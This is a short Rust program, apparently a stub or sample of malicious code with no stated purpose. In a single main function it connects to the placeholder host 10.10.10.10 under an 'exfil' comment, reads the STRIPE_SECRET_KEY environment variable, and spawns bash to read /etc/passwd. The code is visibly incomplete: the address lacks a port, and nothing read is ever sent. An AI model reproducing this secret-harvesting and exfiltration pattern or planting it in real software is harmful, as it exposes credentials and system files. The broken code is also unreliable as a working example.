use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.10.10.10") { /* exfil */ }
    let _v = env::var("STRIPE_SECRET_KEY").unwrap_or_default();
    Command::new("bash").arg("-c").arg("cat /etc/passwd").spawn().ok();
}
